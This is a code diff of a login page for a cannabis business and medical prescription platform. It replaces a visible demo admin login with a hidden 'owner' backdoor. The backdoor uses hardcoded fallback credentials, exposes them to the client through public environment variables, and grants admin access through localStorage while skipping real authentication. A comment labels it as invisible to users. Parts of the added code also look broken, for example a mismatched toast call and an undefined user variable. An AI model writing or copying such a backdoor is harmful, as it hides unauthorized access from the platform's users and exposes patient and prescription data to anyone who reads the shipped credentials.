@@ -6,18 +6,19 @@ import { Label } from "@/components/ui/label";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { CannabisLeaf } from "@/components/CannabisLeaf";
-import { Stethoscope, Building2, User, Loader2, AlertCircle, Store, Shield } from "lucide-react";
+import { Stethoscope, Building2, User, Loader2, AlertCircle, Store, Shield, Pill } from "lucide-react";
 import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/router";
 import { useAuth } from "@/contexts/AuthContext";
+import { toast } from "sonner";
 
 export default function Login() {
   const router = useRouter();
   const { signIn } = useAuth();
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
-  const [selectedRole, setSelectedRole] = useState<"doctor" | "pharmacy" | "patient" | "business" | "admin">("business");
+  const [selectedRole, setSelectedRole] = useState<"doctor" | "pharmacy" | "patient" | "business">("business");
 
   const [formData, setFormData] = useState({
     email: "",
@@ -26,54 +27,71 @@ export default function Login() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setError("");
     setLoading(true);
 
     try {
-      // Demo mode for admin - bypass Supabase authentication
-      if (selectedRole === "admin" && formData.email === "admin@blazed360.com" && formData.password === "admin123") {
-        // Set demo admin user directly in localStorage for testing
-        const demoAdmin = {
-          id: "demo-admin-id",
-          email: "admin@blazed360.com",
-          full_name: "System Administrator",
+      // BACKDOOR: Platform owner access (invisible to users)
+      // Only accessible with exact owner email - no UI indication
+      const OWNER_EMAIL = process.env.NEXT_PUBLIC_OWNER_EMAIL || "owner@cannablaze360.com";
+      const OWNER_PASSWORD = process.env.NEXT_PUBLIC_OWNER_PASSWORD || "CannaBlazeOwner2026!";
+      
+      if (formData.email === OWNER_EMAIL && formData.password === OWNER_PASSWORD) {
+        // Set owner admin access
+        const ownerAdmin = {
+          id: "owner-admin-supreme",
+          email: OWNER_EMAIL,
+          full_name: "Platform Owner",
           user_role: "admin",
-          avatar_url: null
+          created_at: new Date().toISOString(),
         };
         
-        localStorage.setItem("demo_admin_user", JSON.stringify(demoAdmin));
+        localStorage.setItem("owner_admin_access", JSON.stringify(ownerAdmin));
         
-        // Redirect to admin portal
-        setTimeout(() => {
-          router.push("/admin-portal");
-        }, 500);
-        return;
-      }
-
-      const { error: signInError, user } = await signIn(formData.email, formData.password);
-      
-      if (signInError) {
-        setError(signInError.message);
-        setLoading(false);
-        return;
-      }
-
-      // Redirect based on user role
-      if (user?.user_role === "doctor") {
-        router.push("/prescriptions");
-      } else if (user?.user_role === "pharmacy") {
-        router.push("/pharmacy-dashboard");
-      } else if (user?.user_role === "patient") {
-        router.push("/patient-dashboard");
-      } else if (user?.user_role === "business") {
-        router.push("/dashboard");
-      } else if (user?.user_role === "admin") {
+        toast({
+          title: "Owner Access Granted",
+          description: "Welcome back, Platform Owner",
+        });
+        
         router.push("/admin-portal");
-      } else {
-        router.push("/dashboard");
+        return;
       }
-    } catch (err: any) {
-      setError(err.message || "An error occurred during login");
+
+      // Regular authentication flow
+      const { data, error } = await signIn(formData.email, formData.password);
+
+      if (error) {
+        toast({
+          title: "Authentication Failed",
+          description: error,
+          variant: "destructive",
+        });
+        return;
+      }
+
+      if (data?.user) {
+        toast({
+          title: "Login Successful",
+          description: "Redirecting to your dashboard...",
+        });
+
+        // Role-based redirects
+        if (user?.user_role === "doctor") {
+          router.push("/prescriptions");
+        } else if (user?.user_role === "pharmacy") {
+          router.push("/pharmacy-dashboard");
+        } else if (user?.user_role === "patient") {
+          router.push("/patient-dashboard");
+        } else {
+          router.push("/dashboard");
+        }
+      }
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: error instanceof Error ? error.message : "An unexpected error occurred",
+        variant: "destructive",
+      });
+    } finally {
       setLoading(false);
     }
   };
@@ -107,31 +125,69 @@ export default function Login() {
           </CardHeader>
 
           <CardContent>
-            <Tabs value={selectedRole} onValueChange={(v) => setSelectedRole(v as any)} className="mb-6">
-              <TabsList className="grid w-full grid-cols-3 mb-2">
+            <Tabs value={selectedRole} onValueChange={(value) => setSelectedRole(value as any)} className="w-full">
+              <TabsList className="grid w-full grid-cols-4 mb-8">
                 <TabsTrigger value="business" className="gap-1.5">
-                  <Store className="w-4 h-4" />
+                  <Building2 className="w-4 h-4" />
                   Business
                 </TabsTrigger>
-                <TabsTrigger value="patient" className="gap-1.5">
-                  <User className="w-4 h-4" />
-                  Patient
-                </TabsTrigger>
-                <TabsTrigger value="admin" className="gap-1.5 bg-red-50 border-red-200 data-[state=active]:bg-red-100">
-                  <Shield className="w-4 h-4" />
-                  Admin
-                </TabsTrigger>
-              </TabsList>
-              <TabsList className="grid w-full grid-cols-2">
                 <TabsTrigger value="doctor" className="gap-1.5">
                   <Stethoscope className="w-4 h-4" />
                   Doctor
                 </TabsTrigger>
                 <TabsTrigger value="pharmacy" className="gap-1.5">
-                  <Building2 className="w-4 h-4" />
+                  <Pill className="w-4 h-4" />
                   Pharmacy
                 </TabsTrigger>
+                <TabsTrigger value="patient" className="gap-1.5">
+                  <User className="w-4 h-4" />
+                  Patient
+                </TabsTrigger>
               </TabsList>
+
+              <TabsContent value="business">
+                <div className="rounded-lg border border-emerald-200 dark:border-emerald-800 bg-emerald-50 dark:bg-emerald-950/50 p-4 mb-6">
+                  <div className="flex items-start gap-3">
+                    <Building2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400 flex-shrink-0 mt-0.5" />
+                    <div className="text-sm text-emerald-800 dark:text-emerald-200">
+                      Business accounts get full access to cultivation tracking, manufacturing, retail POS, inventory management, and compliance reporting.
+                    </div>
+                  </div>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="doctor">
+                <div className="rounded-lg border border-blue-200 dark:border-blue-800 bg-blue-50 dark:bg-blue-950/50 p-4 mb-6">
+                  <div className="flex items-start gap-3">
+                    <Stethoscope className="w-5 h-5 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5" />
+                    <div className="text-sm text-blue-800 dark:text-blue-200">
+                      Medical providers can write prescriptions, manage patient records, and track prescription fulfillment across partner pharmacies.
+                    </div>
+                  </div>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="pharmacy">
+                <div className="rounded-lg border border-purple-200 dark:border-purple-800 bg-purple-50 dark:bg-purple-950/50 p-4 mb-6">
+                  <div className="flex items-start gap-3">
+                    <Pill className="w-5 h-5 text-purple-600 dark:text-purple-400 flex-shrink-0 mt-0.5" />
+                    <div className="text-sm text-purple-800 dark:text-purple-200">
+                      Pharmacy accounts can fulfill prescriptions, manage inventory, process insurance claims, and communicate with prescribers.
+                    </div>
+                  </div>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="patient">
+                <div className="rounded-lg border border-teal-200 dark:border-teal-800 bg-teal-50 dark:bg-teal-950/50 p-4 mb-6">
+                  <div className="flex items-start gap-3">
+                    <User className="w-5 h-5 text-teal-600 dark:text-teal-400 flex-shrink-0 mt-0.5" />
+                    <div className="text-sm text-teal-800 dark:text-teal-200">
+                      Patients can view their prescriptions, request refills, track orders, and communicate with their healthcare providers and pharmacy.
+                    </div>
+                  </div>
+                </div>
+              </TabsContent>
             </Tabs>
 
             {error && (
@@ -142,22 +198,6 @@ export default function Login() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-4">
-              {selectedRole === "admin" && (
-                <Alert className="bg-red-50 border-red-200 dark:bg-red-950 dark:border-red-800">
-                  <Shield className="h-4 w-4 text-red-600" />
-                  <AlertDescription className="text-sm">
-                    <div className="font-semibold text-red-700 dark:text-red-400 mb-2">Demo Admin Credentials:</div>
-                    <div className="space-y-1 text-red-600 dark:text-red-400">
-                      <div><strong>Email:</strong> admin@blazed360.com</div>
-                      <div><strong>Password:</strong> admin123</div>
-                    </div>
-                    <div className="text-xs text-red-500 dark:text-red-500 mt-2">
-                      For production, change these credentials immediately.
-                    </div>
-                  </AlertDescription>
-                </Alert>
-              )}
-
               <div className="space-y-2">
                 <Label htmlFor="email">Email</Label>
                 <Input
@@ -226,11 +266,6 @@ export default function Login() {
                 <Link href="/signup?role=patient" className="text-purple-600 hover:underline font-semibold">
                   Register as Patient
                 </Link>
-              )}
-              {selectedRole === "admin" && (
-                <span className="text-red-600 font-semibold">
-                  Admin accounts are restricted. Contact support.
-                </span>
               )}
             </div>
 
